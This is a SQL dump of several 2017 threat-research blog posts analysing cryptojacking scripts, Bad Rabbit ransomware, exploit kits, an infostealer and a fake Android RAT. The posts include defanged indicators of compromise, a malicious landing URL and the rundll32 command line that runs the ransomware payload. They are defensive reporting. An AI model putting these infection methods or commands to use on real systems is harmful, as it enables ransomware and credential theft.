INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (49, 'Web-services monetization driven by crypto currency mining in websites and mobile apps', 'Manohar Ghule', 'November 02, 2017', 'A paradigm shift has been observed since last month in website monetization techniques. Website monetization is the process of converting traffic sent to a website into revenue. \"Pay-Per-Click\" Advertising, \"Selling Ad Space\", \"Affiliate Marketing\" and \"Donations\" are the most common practices used for monetizing a website. The idea of mining crypto-currency on a user\'s browser to monetize a website was introduced by a company called Coinhive. Coinhive provides a JavaScript library that can be invoked within a loaded webpage to start mining for cryptocurrency called Moneros (XMR) as an alternative source of revenue. As a service fee Coinhive keeps 30% of earned XMR and 70% share is given to site owner. As a result, the user gets an ad free experience on the webpage at the cost of some CPU cycles, the website owner earns 70% and the mining-service provider gets 30% of the generated XMR: appears to be Win-Win for everyone.         This new  website monetization tactic has attracted much attention. Torrent sites like \"The Pirate Bay,\" as well as certain porn sites, have quickly adopted it. Also, similar service providers such as Crypto-loot, CoinBlind, CoinNebula, MineMyTraffic, Jsecoin, Coin-Have, PPoi and Adsencebase have emerged.    In the month of October, we found around 2K unique domains that had embedded coin mining JavaScript and ~20K unique URLs churning CPUs of users to generate revenue.             Fig 1: Daily unique webpage hit count  in Oct-17.             Fig 2: Geo-location of hosts/websites those adopted in-browser mining.             Fig 3: Geo-location of clients who accessed mining websites.         The more time a user spends on the site the more revenue will be generated. Websites providing video streaming and file-sharing services tend to benefit more from in-browser mining. As a result, we are seeing more hits on these types of websites. In addition to  voluntarily deploying mining, we have also noticed that mining has been deployed on compromised sites too – giving the bad guys one more vector that can be abused for financial gain.             Fig 4: Top-100 sites based on number of hits.         As traditional website monetization has introduced risks of personal data theft through adware and malvertisements, browser mining has similarly opened the door for new types of threats.    From a security perspective, crypto-currency mining inside browsers is not malicious by itself. However, we observed that this practice is being carried out silently without end user’s consent and knowledge, which makes it undesirable. Cyber criminals are injecting mining script in compromised websites which secretly consume CPU cycles of a user\'s laptop or mobile device to mine cryptocurrency when the user visit the website. This is a resource-hijack attack where there is no immediate way to tell that a webpage is consuming CPUs. However, one site performing mining is likely to bring poor experience on the websites open in other tabs. Moreover, multiple webpages will drain the CPU if it performs mining parallelly in different tabs. When these kind of miners are in action, a user will find the computer or the mobile device  running slower and the CPU temperature will rise causing mobiles to overheat, which may damage or reduce the life of the device. Additionally, this could result in increased electricity bill for users.             Fig 5: CPU Usage in normal conditions.             Fig 6: CPU Usage when mining started.             Fig 7: Source code of webpage embedded mining script.         JavaScript Miners for Mobile    The phenomenon of in-browser JavaScript based cryptocurrency mining has made its way to Android applications on the Google Play Store too. Researchers found some apps which are using Coinhive’s service without any notification to the user. When an app with the cryptocurrency miner is opened, it will start consuming resources, leading to reduced battery life and slower performance of device.        Fig 8: Snapshot of JavaScript code used for mining in an app.         One can argue that in-browser mining is a neat and clean alternative for pop-ups and banner ads because ads are annoying and have their own privacy and security concerns. On other hand, consuming user’s resources without their consent makes this practice precarious. In our findings, we observed that none of mining services prompted the user or provided an opt-out option. Therefore, we are blocking such webpages. In a response to security concerns on illegitimate mining, Coinhive has also introduced a JavaScript library that provides opt-out option to users.', 'Abuse', 'http://www.zscaler.com/blogs/research/new-era-crypto-currency-mining-websites-and-mobile-apps');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (50, 'Bad Rabbit – A new Petya ransomware variant', 'Deepen Desai', 'October 24, 2017', 'Please join our webcast for additional details regarding this attack.\r\n\r\nUpdated - October 25, 2017\r\n\r\nIntroduction\r\n\r\nAlmost four months after the last major outbreak, we are seeing a new variant of Petya ransomware dubbed \"Bad Rabbit,\" and it\'s impacting multiple businesses, primarily in Russia and Ukraine. There have also been reports of businesses impacted in Germany, Turkey, and other countries. The ransomware payload contains a self-propagation module designed to perform lateral movement across the corporate network upon successful infection, which makes this threat highly virulent. The initial infection vector appears to be two Russian news agency sites : fontanka[.]ru and interfax[.]ru. [UPDATE] We have found several other news and media sites (Russian, Bulgarian, Japanese, and others) that were compromised, leading users to a fake Flash Player installer payload.\r\n\r\n\r\n\r\nFigure 1 - Bad Rabbit outbreak overview\r\n\r\n \r\n\r\nBad Rabbit ransomware analysis\r\n\r\n\r\n\r\nFigure 2 - Infection cycle [UPDATE: multiple other compromised Russian news and media sites were also part of this campaign]\r\n\r\nWe saw multiple instances from this outbreak in the Zscaler cloud, and the new ransomware payload was flagged as malicious by the Zscaler Cloud Sandbox module. For this blog, we will analyze the attack cycle where the user was redirected from the fontanka[.]ru news site to another compromised site, as shown in Figure 2, which serves the ransomware executable payload.\r\n\r\nUsers visiting one of the compromised sites (on the day of outbreak) were prompted by a Flash update screen as shown below:\r\n\r\n\r\n\r\nFigure 3 - Fake Adobe Flash Player update prompt\r\n\r\nOnce a user clicks the INSTALL button, the ransomware executable will be downloaded on the victim\'s machine. The payload will masquerade as Adobe Flash Player setup using the Adobe Flash installer icon, as shown below:\r\n\r\n\r\n\r\nFigure 4 - Executable using fake icon\r\n\r\nThe executable payload is also signed using a fake certificate as shown below:\r\n\r\n\r\n\r\nFigure 5 - Fake Symantec-issued certificate [NOT A LEGITIMATE CERTIFICATE]\r\n\r\nThe fake Flash Player installer drops the main payload DLL file as \"infpub.dat\" in the Windows directory and executes it with the following arguments:\r\n\r\n“C:\\windows\\system32\\rundll32.exe c:\\windows\\infpub.dat,#1 15”\r\n\r\nFile Encryption\r\n\r\nInfpub.dat is responsible for enumerating files on the infected system and encrypting any files that contain the following extension:\r\n\r\n\r\n\r\nFigure 6 - File extensions targeted by Bad Rabbit\r\n\r\nBad Rabbit ransomware leverages AES encryption and uses CryptEncryptA API to encrypt the files on the infected machine. Unlike many other ransomware families, Bad Rabbit does not change the extension of the encrypted files; instead, the ransomware payload relies on a unicode string marker – \"encrypted\" – that is appended at the end of all the files that are encrypted.\r\n\r\n\r\n\r\nFigure 7 - Encrypted file marker\r\n\r\nLateral movement\r\n\r\nThe ransomware contains a list of commonly used username and passwords embedded in the payload. The payload will scan the internal network for any reachable SMB shares and will perform brute force authentication using the stored credentials. \r\n\r\n\r\n\r\nFigure 8 - Bad Rabbit embedded username and password list\r\n\r\n\r\n\r\nFigure 9 - Brute Force login attempts to spread laterally\r\n\r\nUpon successful infection, the system will reboot and the end user will see the dreadful ransom screen:\r\n\r\n\r\n\r\nFigure 10 - Bad Rabbit ransom note\r\n\r\nThe onion site requests the user\'s personal installation key, so the user may receive the ransom amount and further instructions:\r\n\r\n\r\n\r\nFigure 11 - Onion site for ransom payment instructions\r\n\r\nZscaler ThreatLabZ is actively monitoring this threat and will continue to ensure coverage for Zscaler customers. We will continue to update this blog with additional information as we further analyze the payloads. \r\n\r\nIndicators of Compromise\r\n\r\nMD5 hashes\r\n\r\nfbbdc39af1139aebba4da004475e8839\r\n\r\nb14d8faf7f0cbcfad051cefe5f39645f (dropped file)\r\n\r\nCompromised intermediate site\r\n\r\n1dnscontrol[.]com\r\n\r\nZscaler Coverage\r\n\r\nAdvanced Threat Signatures\r\n\r\n\r\n	Malurl.Gen.XO\r\n	mal/generic-s.z\r\n	win32.ransom.diskcoder\r\n\r\n\r\nCloud Sandbox report', 'Ransomware', 'https://www.zscaler.com/blogs/research/bad-rabbit-new-petya-ransomware-variant');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (51, 'Terror Exploit Kit via Malvertising campaign', 'Rohit Hegde', 'October 24, 2017', 'Terror Exploit Kit (EK) is one of the newer EKs that came to the scene in early 2017 and was mentioned in our Winter 2017 quarterly EK roundup where it was mainly installing ccminer Bitcoin mining applications. Terror EK activity has been low throughout the year but we are starting to see an uptick in the activity delivered via malvertising campaigns in past two months.\r\n\r\nThe graph below shows Terror EK activity for past two months.\r\n\r\n\r\n\r\nFigure 1: Terror EK activity between September 1 and October 23, 2017.\r\n\r\nThe image below shows recent Terror EK cycles from this month.\r\n\r\n\r\n\r\nFigure 2: Terror Exploit Kit Cycles\r\n\r\nIn this blog, we will look at the Terror EK flow and a few changes in the exploit kit that we observed in the recent campaign.\r\n\r\nTerror EK redirects are seen in the form of fake advertisement pop-ups; one such advertisement is shown below.\r\n\r\n\r\n\r\nFigure 3: Terror EK malvertisement website.\r\n\r\nThe malvertising campaigns have themes like \'20 minute fat loss\', \'quit smoking\' and \'science\'. Few of the redirects were from Propeller Ads media network, through their onclkds[.]net domain.    \r\n\r\nThe initial JavaScript that gets served via a malicious advertisement page is obfuscated as seen below,\r\n\r\n\r\n\r\nFigure 4: Obfuscated JavaScript loaded by the malvertisement website.\r\n\r\nThe deobfuscated version of this JavaScript is shown below.\r\n\r\n\r\n\r\nFigure 5: Deobfuscated version of the JavaScript.\r\n\r\nWhen a request is sent to the .php page, it responds with a HTTP 302 redirect to Terror EK Landing page, shown below.\r\n\r\n\r\n\r\nFigure 6: HTTP 302 redirect response from .php page loaded by JavaScript.\r\n\r\nThe Terror EK landing page has VBScript and JavaScript exploits, shown below.\r\n\r\n\r\n\r\nFigure 7: CVE-2016-0189 exploit on Terror EK landing page.\r\n\r\nA snippet of malicious JavaScript on the Terror EK landing page is shown below.\r\n\r\n\r\n\r\nFigure 8: Malicious Javascript on Terror EK Landing page.\r\n\r\n\r\n\r\nFigure 9: CVE-2014-6332 exploit on Terror EK landing page.\r\n\r\nThe CVEs observed on the landing page are CVE-2016-0189 and CVE-2014-6332. At the end of the landing page, there is a call to another URL which tries to load three flash exploits.\r\n\r\nThe call to the URL can be seen below.\r\n\r\n\r\n\r\nFigure 10: URL redirect to Flash exploit website.\r\n\r\nOn the flash exploit URL shown in Figure 10, we will see three calls for SWF files.\r\n\r\n\r\n\r\nFigure 11: Calls to three flash payloads from Flash exploit webpage.\r\n\r\nWe have seen changes in the Flash exploit payloads seen recently; notice the different file sizes in the two cycles below.\r\n\r\nPrevious:\r\n\r\n\r\n\r\nFigure 12: Flash payload from Terror EK Cycle 1.\r\n\r\nNew:\r\n\r\n\r\n\r\nFigure 13: Flash payload from Terror EK Cycle 2.\r\n\r\nIn the Terror EK cycle #1 shown in Figure 12, we could see the fingerprinting attempt in the Flash payload:\r\n\r\n\r\n\r\nFigure 14: Decompiled Flash payload showing fingerprinting code.\r\n\r\nThe Terror EK actors have now started protecting their SWF files from decompilers using the \"DComSoft SWF protector,\" as seen below.\r\n\r\n\r\n\r\nFigure 15: Flash payload showing banner of the tool used to encrypt and protect Flash payload.\r\n\r\nThe malware payload that is getting served in these recent Terror EK malvertising chains belongs to the Smoke Loader downloader Trojan family. We observed that Smoke Loader payload with MD5 hash of \"6ea344d0db80ab6e5cabdc9dcecd5ad4\" was served for an active Terror EK cycle earlier this week  the most recent payload has MD5 hash of \'b23745bcd2937b9cfaf6a60ca72d3d67\'.\r\n\r\nConclusion:\r\n\r\nThe recent uptick in Terror EK activity via malvertising campaigns suggests that the Terror EK authors are actively updating the kit by adding new obfuscation layers, exploit and malware payloads. Their goal is for the kit to evade detection by security engines and make the attacks more effective. Zscaler ThreatLabZ is actively monitoring Terror EK activity to ensure that Zscaler customers are protected.\r\n\r\nIndicators of Compromise (IOCs):\r\nhi.notkodi[.]science\r\ngoods-boot[.]accountant\r\nfacilities-occupation[.]loan\r\nestimate-smell[.]win\r\ngoods-bag[.]cricket\r\ndisadvantage-roof[.]webcam\r\nexplanation-shampoo[.]cricket\r\nrisk-pantyhose[.]trade\r\n\r\nMD5 hashes (Smoke Loader and SWF payloads)\r\n\r\n7215ee9c7d9dc229d2921a40e899ec5f\r\ncf3f532f2b25953b8ea3d30429dbeec5\r\n171907c1490f7856f73a195da3f72497\r\n06c8fb254196421f1bd4cd0234b52fa6\r\n6e8ae2da57167a0c47b42953d9ffaa57\r\nbfa8e123c2f037f6849dd331da73da0a\r\n849bcdea44e56f4b6471f2e1269be519\r\n7215ee9c7d9dc229d2921a40e899ec5f\r\n4e35757ebcf82eaea857af69ce825c9d', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/terror-exploit-kit-malvertising-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (52, 'Infostealer spreading through a compromised website', 'Tarun Dewan', 'October 04, 2017', 'The Zscaler ThreatLabZ team has uncovered a new password stealer malware variant being delivered through a compromised website. The payload is Microsoft Intermediate Language (MSIL) compiled and steals the passwords from victims\' system, browser, and FTP software.\r\n\r\nThe payload analyzed in this blog was served from the compromised website dnoymuzik[.]com/wp-content/test/conhost[.]exe. \r\n\r\nDelivery vector\r\n\r\nThe delivery method for this malware is the VBScript, which downloads the payload from the compromised website, and then downloads a decoy document to lead the victim to believe that the downloaded files are legitimate. Activities performed by VBScript file are as follows:\r\n\r\n\r\n	Downloads decoy document\r\n	Terminate Microsoft Word process\r\n	Downloads payload through a PowerShell command\r\n	Removes the document recovery entries of Microsoft Word through registry entries\r\n\r\n\r\n \r\n\r\n\r\n\r\nFigure 1: Screen capture of VBScript activity\r\n\r\n\r\n\r\nFigure 2: Screen capture decoy document\r\n\r\nThe decoy document poses as a \"public service\" message from a government organization and includes spam mitigation instructions. \r\n\r\nOnce the malware is executed, it performs various password stealing activities, such as checking for antivirus and looking into the directories and files from which it will steal information. The most interesting function of this malware is that it also behaves like a file stealer, as it checks for interesting strings in the system with enumeration of various files and folders and uploads to the malware\'s C&C once it grabs the sensitive information (Figure 3):\r\n\r\n\r\n\r\nFigure 3: Checking for installed antivirus products\r\n\r\n\r\n\r\nFigure 4: Looking at directories and files for stealing passwords and collecting information\r\n\r\n\r\n\r\nFigure 5: Checking for strings in the system with enumeration of various files and folders and upload to the C&C\r\n\r\nThe following screen captures show different extensions that the malware targets in the victim\'s machine for stealing credentials:\r\n\r\n\r\n\r\nFigure 5: Strings of extensions\r\n\r\n\r\n\r\nFigure 6: Strings of extensions\r\n\r\nThe screen captures below show snippets of password stealing of various browsers and software before uploading to the C&C server:\r\n\r\n\r\n\r\nFigure 7: Chrome password stealer\r\n\r\n\r\n\r\nFigure 8: Uploading to the C&C server\r\n\r\n\r\n\r\n\r\nFigure 9: CuteFTP password stealer\r\n\r\n\r\n\r\n\r\nFigure 10: Electrum Bitcoin password stealer\r\n\r\n\r\n\r\nFigure 11: Firefox password stealer\r\n\r\n\r\nThe malware steals passwords from the following software and browsers:\r\n\r\n\r\n	Armory Wallet\r\n	Chrome\r\n	Firefox\r\n	CuteFTP\r\n	FileZilla\r\n	Putty\r\n	Electrum bitcoin wallet\r\n	WinSCP Passwords\r\n\r\n\r\n \r\n\r\nNetwork communication:\r\n\r\n\r\n\r\nFigure 12: Network information\r\n\r\n \r\n\r\nBelow is the snapshot of stolen data from the victim\'s machine by the malware author\r\n\r\n\r\n\r\nFigure 13: Stolen data\r\n\r\nConclusion\r\n\r\nThis is yet another infostealer malware that attempts to steal stored credentials from a victim\'s machine. The malware also contains modules to steal sensitive files such as private keys, SSH keys, bitcoin wallets, etc. ThreatLabZ will continue to monitor this malware to ensure that Zscaler customers are protected.\r\n\r\nThe Zscaler Cloud Sandbox report highlighting the indicators is shown in screenshot below: \r\n\r\n\r\n\r\nFigure 14: Zscaler Cloud Sandbox malware report', '', 'http://www.zscaler.com/blogs/research/infostealer-spreading-through-compromised-website');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (53, 'Don\'t lose your privacy for Sarahah\'s Anonymity', 'Shivang Desai', 'September 19, 2017', 'A new app called Sarahah, which allows people to receive anonymous feedback messages from friends and coworkers, has been quickly gaining popularity. Though it seems like a good concept, the app has already been criticized for silently uploading users’ contacts to its servers. \r\n\r\nAs a result of its quick growth, the ThreatLabZ team was certain the Sarahah app would be a top-of-mind target for attackers. We kept a close watch for any malicious indicators and came across a remote access Trojan (RAT) portraying itself as the app. \r\n\r\nThe Zscaler sandbox readily marked the fake Android app as malicious, as shown in screenshot below: \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 1 - Zscaler Sandbox report\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nThe payload is a RAT variant created using DroidJack, a RAT builder that has been in the wild for quite a while. A few months back, we posted a blog about a fake system update on Google Play that was using traces of DroidJack. We also wrote recently about fake Pokemon GO variants, prepared using DroidJack, that were making the rounds in the wild. \r\n\r\nDroidJack is a sophisticated piece of software that allows users to build Android Trojans with the ability to perform many invasive tasks: \r\n\r\n\r\n	Bind malicious code with any desired APK\r\n	Delete/Add/Modify/Download/Upload files from a victim\'s device\r\n	Spy on SMS Messages\r\n	Record phone conversations\r\n	Read/copy a victim\'s contacts\r\n	Take pictures from an infected device camera\r\n	Listen to a live conversation using an infected device mic\r\n	View browser history\r\n	Steal a victim\'s location\r\n	And many, many more\r\n\r\n\r\nTechnical Details \r\nApp Name : Sarahah\r\nMD5 : 3a9c32d270f19384e148b0f24d916a5f\r\nPkg Name : net.droidjack.server\r\n\r\nOnce installed, the malware app portrays itself as the Sarahah app. The screenshot below show the graphic of the official Sarahah app (left) and the fake app (right). \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 2 - Sarahah App- Original(Left) vs Fake(Right)\r\n			 \r\n		\r\n	\r\n\r\n\r\n \r\n\r\nAs soon as the victim clicks on the fake app, it asks for Admin privileges. Once admin rights are acquired, the icon disappears. The user may think the app has been removed, but it has only hidden itself.\r\n\r\nOnce hidden, the app begins running services that will later handle all the major malicious activities of DroidJack mentioned above. \r\n\r\nThe first function invoked by the malware is called MainActivity, which hides the fake app and starts an Android service called Controller.  \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 3 - Main Activity\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nMajor activities highlighted in the top left corner of the above screenshot are as follows:\r\n\r\n\r\n	CallListener : Handler taking care of call logging.\r\n	CamSnap : Designed to capture photos.\r\n	Connector : Broadcast Receiver designed to start Controller Service on every reboot.\r\n	Controller : Contains code to make connections with Command & Control(C&C) Centre. It uses open sourced Kryonet library for setting up connections.\r\n	GPSLocation : Contains code to capture GPS location.\r\n	VideoCap : Designed to capture live video using victim\'s camera. \r\n\r\n\r\nWe also found hard-coded C&C details in the source code where the author leverages a dynamic DNS domain.\r\n\r\nThe screenshot below shows the C&C details:\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 4 - Command & Control (C&C) details\r\n		\r\n	\r\n\r\n\r\n\r\nStealing SMS Messages \r\n\r\nDroidJack RAT is designed to read all email inbox messages as well as incoming SMS messages and send them to the C&C server. It also aborts new message notification, leaving the victim unaware of any new message received. \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 5 - Reading inbox SMS Messages\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nThe screenshot below shows the code responsible for fetching incoming SMS messages and aborting the notification: \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 6 - Reading incoming SMS Messages\r\n		\r\n	\r\n\r\n\r\n\r\nAlong with stealing SMS messages, the RAT is also capable of sending messages to any number sent by the attacker. \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 7 - Send SMS Fucntionality\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nUpon further inspection, we found that this fake app also targets WhatsApp data. \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 8 - Accessing Whatsapp Data\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nContacts and Calls \r\n\r\nAlong with SMS stealing, the fake Sarahah app is snooping around for the victim\'s contact details. \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 9 - Reading Contacts\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nFake Sarahah app is also capable of dynamically calling desired numbers. \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 10 - Calling Functionality\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nThis RAT has the ability to record calls in a file with the .amr extension, which is later sent to the C&C server. It also steals GPS locations as well as browser history and bookmarks. \r\n\r\nAfter all the desired data has been snooped out, it is stored in a database locally under /data/net.droidjack.server/<database_name>. Databases are named as follows:\r\n\r\n\r\n	SandroRat_CurrentSMS_Database - Incoming SMS \r\n	SandroRat_RecordedSMS_Database - Inbox SMS \r\n	SandroRat_CallRecords_Database - Call Recordings.\r\n	SandroRat_Contacts_Database - Victim\'s Contact details.\r\n	SandroRat_BrowserHistory_Database - Browser history and bookmarks   \r\n\r\n\r\nOne more final precaution is taken by the fake Sarahah app while transmitting stolen data over the wire. It uses AES encryption to send the data to the C&C server. This step may be taken to prevent data from being easily detected during malware analysis through a proxy.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig 11 - AES Encryption\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nConclusion\r\n\r\nAttackers will continue to target victims by embedding malicious code into any new, popular Android app, as it’s an easy way to quickly widen their attack base. This was the case with Netflix and Pokemon GO. Attackers exploit people’s appetite for new apps and their desire to be the first to have them by offering up fakes before the real versions are officially launched or by mimicking add-on functionality that is not yet available in the official app. \r\n\r\nThreatLabZ strongly advises users to stay away from scams like the fake Sarahah app and download apps only from official Android stores, like Google Play. As an added precaution, it is advisable to review an Android app\'s permissions before installing it to get a clear picture of the app’s capabilities and the developer’s motive.\r\n\r\nThreatLabZ will continue to monitor the use of apps for spreading malware to ensure that Zscaler customers remain protected from such attacks.', '', 'https://www.zscaler.com/blogs/research/dont-lose-your-privacy-sarahahs-anonymity');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (54, 'BESCOM users being redirected to RIG EK', 'Rohit Hegde', 'September 13, 2017', 'BESCOM (Bangalore Electricity Supply Company Limited) is responsible for power distribution in eight districts of the Indian state Karnataka. The total area is roughly 15,900 square miles and serves a population of roughly 20 million people.\r\n\r\nZscaler ThreatLabZ researchers recently discovered that malicious actors strategically placed malicious redirects on the bill payment page of the BESCOM portal. These redirects were active on 11 September 2017 and made the website unusable.\r\n\r\nWe also observed redirects to the RIG exploit kit (EK) coming from bescom[.]org/en/paybill/, which was sending users to the RIG landing page URL, below:\r\n\r\n188.225.82[.]40/?NTU4NzYx&party=UDVXgiUfTfABgyYxZBggX8v37h0XQzkOYhp7X-.....\r\n\r\n\r\n\r\nFigure 1: RIG EK redirect hits from bescom[.]org/en/paybill/\r\n\r\nSubsequent attempts to load bescom[.]org/en/paybill resulted in redirects to cryptocurrency scam sites and YouTube videos for cryptocurrency scams.\r\n\r\nThe redirect occurs because of a meta refresh tag on the BESCOM page, which, in this instance, redirects users to http://btc100x[.]rocks.\r\n\r\n\r\n\r\nFigure 2:  btc100x[.]rocks redirect\r\n\r\nThe second redirect we observed was to a YouTube video scam encouraging users to transfer their Bitcoins in order to multiply them. The redirect and the screenshot of the video can be seen below.\r\n\r\n\r\n\r\nFigure 3: Scam YouTube video redirect\r\n\r\n\r\n\r\nFigure 4: Scam YouTube video\r\n\r\nOverview of the RIG EK cycle at 188.225.82[.]40\r\n\r\nWhen we tested the RIG redirect we found that it was still active.\r\n\r\n\r\n\r\nFigure 5: Capture of RIG cycle from the redirected IP\r\n\r\nThe obfuscated JavaScript can be seen below.\r\n\r\n\r\n\r\nFigure 6: Obfuscated JavaScript on the RIG EK landing page\r\n\r\nThis redirect leads to a download of a Flash file which fingerprints the system to determine whether it is vulnerable. A snippet of decompiled Flash is shown in the following image.\r\n\r\n\r\n\r\nFigure 7: Decompiled Flash file\r\n\r\nThe payload that was downloaded is shown below.\r\n\r\n\r\n\r\nFigure 8: Malware payload download attempt\r\n\r\nThe payload fails during execution and throws an error message.\r\n\r\n\r\n\r\nFigure 9: Failed malware execution\r\n\r\nIndicators of compromise (IoCs):\r\n\r\nIP Address: 188.225.82[.]40\r\n\r\n                       188.225.82[.]43\r\n\r\nConclusion\r\n\r\nZscaler ThreatLabZ notified BESCOM of the compromise on September 11, 2017, and, while we did not receive any response, it appears that the company was quick to remediate the issue. Zscaler ThreatLabZ is actively monitoring this campaign to ensure protection for Zscaler customers.', 'Compromise', 'https://www.zscaler.com/blogs/research/bescom-users-being-redirected-rig-ek');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (55, 'Top Exploit Kit Activity Roundup - Summer 2017', 'Derek Gooley,', 'September 12, 2017', 'Overview    This is the sixth installment in a series of blogs highlighting the recent activity of the top exploit kits. Exploit kits (EKs) are rapidly deployable software packages designed to leverage vulnerabilities in web browsers to deliver a malicious payload to a victim’s computer. EK authors offer their services for sale, distributing malware for other malicious actors.    In this blog, we will be looking at the most active EKs, including RIG, Magnitude, Terror, and the newest arrival - Disdain.    You can read our roundup from spring 2017 here.    RIG Exploit Kit    RIG remains the most consistently active exploit kit, distributed over several simultaneous campaigns to install ransomware, banking Trojans, and cryptocurrency mining software on vulnerable systems. In the latter part of spring, we saw a small decline in RIG activity; however, since then, we observed generally steady RIG traffic, with the exception of small spikes in June and August.        Figure 1: RIG hits, June 2017 – August 2017        Figure 2: RIG heat map, June 2017 – August 2017    The distribution of RIG hosts remains somewhat similar to previous reports, although the activity we observed in Southeast Asia and South America earlier this year was absent this quarter.    In addition, the last three months show an increase in the RIG presence in India, as well as a lack of activity in eastern Europe and Russia, a region that usually serves a significant portion of RIG hosts.    For a long time, the structure of most RIG campaigns was mostly static and unchanging, making it trivial for researchers to track and guard against the exploit kit. However, over the last year, many modifications were introduced to the EK, along with frequent changes to its URI scheme.        Figure 3: RIG EK cycle    This instance of a currently active RIG campaign (part of a newer iteration of the \"Seamless\" campaign that began earlier this year) shows an example of a recent URI structure for the EK. The campaign uses the URI parameters \"warm\", \"sea\", and \"gifts\" in transactions with the landing page host, as well the pattern \"/signu[1-4].php\" for its redirection page.        Figure 4: RIG EK redirect page    Recent RIG campaigns have been observed dropping Cerber, GlobeImposter, and Princess ransomware families. These campaigns have been using the CVE-2015-8651 and CVE-2015-5122 Adobe Flash exploits, as well as the scripting engine memory corruption vulnerability exploit CVE-2016-0189.    Magnitude Exploit Kit    The Magnitude EK is one of the longest-running exploit kits, first launched in 2013. This exploit kit has seen much lower volume activity in recent years, compared to RIG, Angler, and Neutrino (when the latter two were active).    Magnitude has primarily targeted Southeast Asian countries through malvertising campaigns, such as in the following recently observed cycle.        Figure 5: Magnitude EK cycle    This campaign has several marked differences from campaigns we described in our previous roundup. This activity shows the campaign managers utilizing the RemarketingPixel advertising network to derive statistics of the infection attempts. The tracking network provides the attackers insight into demographics and the effectiveness of their campaign.    The landing pages in this campaign use various fake file extensions for the scripts and malware payloads, such as .bmp, .sct, etc. This Magnitude campaign was also missing the Adobe Flash fingerprinting scripts we saw in the spring campaigns.    The common CVE-2016-0189 exploit was used to infect vulnerable systems with Cerber ransomware.    Below is an example of a recent Magnitude campaign landing page:        Figure 6: Magnitude EK redirect script    This redirects to a fingerprinting script:        Figure 7: Magnitude EK Kaspersky fingerprinting script    This script attempts to check for the creation of an ActiveX object for the Kaspersky Virtual Keyboard plugin. If the check fails, the exploit chain continues and the victim is redirected to a page that serves the CVE-2016-0189 exploit and infected with Cerber ransomware.        Figure 8: System infected with Cerber    Terror Exploit Kit    The Terror EK is a newer exploit kit we began tracking in late 2016. This kit was formed as an amalgamation of several active exploit kits, particularly using code and exploits taken directly from the Sundown EK. Initially, Terror was relatively unsophisticated and was primarily used to drop ccminer, a cryptocurrency mining package, on exploited systems.    Over the last two quarters, Terror has undergone changes. This spring, Terror introduced a number of host and version fingerprinting scripts and began dropping various malware payloads (Tofsee, Andromeda/Gamarue, Smoke Loader) in addition to ccminer. More recently, Terror introduced the use of CVE-2017-0059, an Internet Explorer exploit affecting versions 9 through 11, and CVE-2017-0037, an exploit affecting Internet Explorer 10 and 11, and Microsoft Edge,    Terror activity dropped off significantly during the spring of 2017, but the exploit kit has remained active.    The code for exploits CVE-2017-0059 and CVE-2017-0037 can be easily identified in Terror EK by their similarity to the proof-of-concept code posted to Google Project Zero\'s bug tracker:        Figure 9: CVE-2017-0059 POC        Figure 10: CVE-2017-0059 in Terror EK        Figure 11: CVE-2017-0037 POC        Figure 12: CVE 2017-0037 in Terror EK    Disdain Exploit Kit    The Disdain EK is a brand-new exploit kit that first appeared in early August. It shares code with Terror EK and uses the same URL pattern, but has many distinct features.    The Disdain campaign we’ve observed is delivered via a gate that is also distributing the RIG EK. Many of the gate domains in this campaign use the format \"campngay##\" with a two-character top-level domain. The referrers to the malicious gates were from malvertising networks and unauthorized movie streaming sites.        Figure 13: Hits for \"campngay\" campaign, August 2017    Disdain has been observed using the exploits CVE-2013-2551, CVE-2015-2419, CVE2016-0189, and CVE-2017-0059.    Trend Micro has published an analysis of Disdain EK here.    Conclusion    Exploit kits pose a significant threat to users during simple web browsing. In the case of ransomware infections, the result could be the inability of a user to access their files. The techniques exploit kit authors use to hide their activities are frequently changing, and security researchers work hard to analyze and block these new threats.    To help avoid infections such as these, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements. Zscaler’s ThreatLabZ has confirmed coverage for these top exploit kits and subsequent payloads, ensuring protection for organizations using the Zscaler’s Internet security platform.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/top-exploit-kit-activity-roundup-summer-2017');
